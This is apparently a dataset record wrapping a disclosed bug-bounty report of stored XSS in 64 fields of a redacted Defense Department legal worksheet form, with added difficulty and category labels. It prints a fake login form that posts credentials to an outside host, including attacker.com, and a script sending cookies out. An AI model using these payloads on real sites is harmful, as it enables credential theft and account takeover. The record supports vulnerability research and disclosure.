@@ -1,0 +1,53 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "un4gi ",
+    "title": "Stored XSS via 64(?) vulnerable fields in \u2588\u2588\u2588 leads to credential theft/account takeover",
+    "content": "\nSummary:\nA user is able to complete a \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 worksheets via https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.\nImpact\nThe attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.\nStep-by-step Reproduction Instructions\nBrowse to https://\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nClick \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588. Once on the \u2588\u2588\u2588\u2588\u2588\u2588 page, click \u2588\u2588\u2588 and \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nClick Continue. \u2588\u2588\u2588\u2588\u2588\u2588\nFill in your name and click Submit. XSS payloads seem to be sanitized properly here from basic tests. \u2588\u2588\u2588\nAny field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total. \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nClick Finish. You will see a confirmation that your request was submitting and receive a ticket number. \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nClick \u2588\u2588\u2588\u2588\u2588\u2588, or return to the \u2588\u2588\u2588\u2588\u2588\u2588\u2588 page and put in your info in the \u2588\u2588\u2588\u2588\u2588 area to modify the worksheet. The XSS will fire in both locations. \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nTo demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:\nCode 218 Bytes\n1<h3>Please login to proceed</h3> <form action=http://\u2588\u2588\u2588\u2588\u2588\u2588>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Logon\"></br>\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\nAn attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:\n<script>window.location=\"http://\u2588\u2588\u2588/?cookie=\" + document.cookie</script>\n\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nSanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.\nImpact\nThe attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1613009220,
+    "report_url": "https://hackerone.com/reports/847176",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Browse to the vulnerable form at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588"
+        ],
+        [
+            2,
+            "Fill in 64 different fields with XSS payloads (e.g., <script>alert(1)</script> or credential-stealing forms)"
+        ],
+        [
+            3,
+            "Submit the form and observe the payloads execute when viewed by legal personnel"
+        ],
+        [
+            4,
+            "For credential theft, use a payload like: <h3>Please login</h3><form action=http://attacker.com>..."
+        ]
+    ],
+    "vuln_description": "Stored XSS across 64 form fields allows attackers to inject persistent malicious scripts, leading to credential theft, session hijacking, or other client-side attacks when viewed by authorized users.",
+    "reason": "The vulnerability is straightforward to discover as it involves basic XSS testing in visible form fields without requiring complex application state manipulation or multi-step logic. The large number of vulnerable fields increases discoverability.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": true
+    },
+    "authnz_metadata": {
+        "reason": "The vulnerability involves stored XSS, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, not on detecting XSS vulnerabilities.",
+        "is_detectable": false
+    }
+}
